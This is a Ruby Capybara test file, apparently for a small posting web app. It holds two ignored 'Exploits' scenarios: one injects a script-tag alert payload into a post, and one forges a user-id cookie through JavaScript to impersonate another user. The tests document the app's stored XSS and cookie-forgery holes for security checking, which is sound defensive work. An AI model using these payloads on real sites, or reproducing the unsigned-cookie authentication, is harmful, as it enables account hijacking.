feature "Exploits", :ignore => true do
  scenario('A user can input a malicious post that displays browser alerts') do
    sign_up
    make_post('<script>window.alert("Hello world")</script>')
    sleep(1)
    visit '/posts'
    alert = page.driver.browser.switch_to.alert.text
    expect(alert).to have_content "Hello world"
  end

  scenario "cookies can be hijacked (via simple javascript manipulation)" do
    sign_up(username: "victim")
    id = User.find_first({"username" => "victim"}).id
    click_link "Sign Out"
    sign_up(username: "hijacker")
    page.execute_script("document.cookie = 'user-id=#{id}'")
    make_post("Hijacked")
    expect(page).to have_content "victim"
  end
end
